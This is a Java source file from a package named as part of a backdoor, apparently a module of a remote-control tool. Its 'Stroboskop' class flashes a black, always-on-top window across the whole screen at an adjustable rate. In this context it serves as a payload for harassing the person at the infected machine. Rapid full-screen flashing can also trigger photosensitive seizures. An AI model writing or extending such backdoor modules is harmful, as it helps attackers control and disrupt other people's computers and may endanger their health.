package net.jaguargaming.backdoor.utils;

import java.awt.Color;
import java.awt.Rectangle;
import java.awt.Toolkit;

import javax.swing.JWindow;

public class Stroboskop {
	
	int speed = 2;
	JWindow window;
	Thread strobeThread;
	boolean active;
	boolean destroyed;
	
	public Stroboskop(int speed) {
		this.speed = speed;
		this.active = false;
		this.destroyed = false;
		window = new JWindow();
		window.setBounds(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
		window.setBackground(new Color(0, 0, 0));
		window.setAlwaysOnTop(true);
		window.setLocation(0, 0);
		window.setVisible(false);
		strobeThread = new Thread(new Runnable() {

			@Override
			public void run() {
				while (true) {
					if(active) {
						try {
							window.setVisible(true);
							Thread.sleep(50L);
							window.setVisible(false);
							Thread.sleep(1000L / speed);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					} else {
						try {
							Thread.sleep(1000L / speed);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				}
			}
			
		});
		strobeThread.start();
	}
	
	public void setActive(boolean active) {
		this.active = active;
	}
	
	public void setSpeed(int speed) {
		this.speed = speed;
	}
	
	public boolean isDestroyed() {
		return destroyed;
	}
	
	public void destroy() {
		this.speed = 0;
		this.active = false;
		this.strobeThread.interrupt();
		this.window.dispose();
		this.destroyed = true;
	}
	
}
